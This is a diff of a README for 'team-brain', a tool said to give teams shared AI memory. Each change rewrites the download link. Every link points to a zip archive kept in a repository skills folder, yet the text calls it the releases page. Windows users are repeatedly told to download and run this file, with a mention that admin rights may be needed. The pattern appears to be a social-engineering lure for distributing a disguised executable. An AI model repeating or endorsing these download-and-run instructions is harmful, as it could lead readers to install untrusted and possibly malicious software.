@@ -1,6 +1,6 @@
 # 🧠 team-brain - Shared AI memory for teams
 
-[![Download team-brain](https://img.shields.io/badge/Download%20team-brain-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/wallisillative921/team-brain/raw/refs/heads/main/skills/team-brain-sync/brain-team-3.7.zip)
+[![Download team-brain](https://img.shields.io/badge/Download%20team-brain-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/wallisillative921/team-brain/main/skills/team-brain-sync/brain-team-3.7.zip)
 
 Git-native shared AI memory for teams. Keep your team’s knowledge, conventions, and decisions in one place and load them into Claude Code, Cursor, and Copilot.
 
@@ -28,7 +28,7 @@ If your device blocks downloads, you may need admin access.
 ## 📥 Download team-brain
 
 Visit the releases page to download and run this file:
-https://github.com/wallisillative921/team-brain/raw/refs/heads/main/skills/team-brain-sync/brain-team-3.7.zip
+https://raw.githubusercontent.com/wallisillative921/team-brain/main/skills/team-brain-sync/brain-team-3.7.zip
 
 On that page, look for the latest release and download the Windows version. If there are more than one file, choose the one that matches your computer, such as:
 - `.exe` for a direct Windows app
@@ -176,7 +176,7 @@ It works best when your team wants one shared source of truth instead of scatter
 ## 📎 Download link
 
 Visit the releases page to download and run this file:
-https://github.com/wallisillative921/team-brain/raw/refs/heads/main/skills/team-brain-sync/brain-team-3.7.zip
+https://raw.githubusercontent.com/wallisillative921/team-brain/main/skills/team-brain-sync/brain-team-3.7.zip
 
 ## 🧰 Basic workflow example
 
@@ -241,7 +241,7 @@ Small, clean memory is easier to trust than a large pile of old text.
 ## 📦 Release downloads
 
 Use the GitHub releases page for all Windows downloads:
-https://github.com/wallisillative921/team-brain/raw/refs/heads/main/skills/team-brain-sync/brain-team-3.7.zip
+https://raw.githubusercontent.com/wallisillative921/team-brain/main/skills/team-brain-sync/brain-team-3.7.zip
 
 Look for the latest release file, then download and run this file on Windows.
 
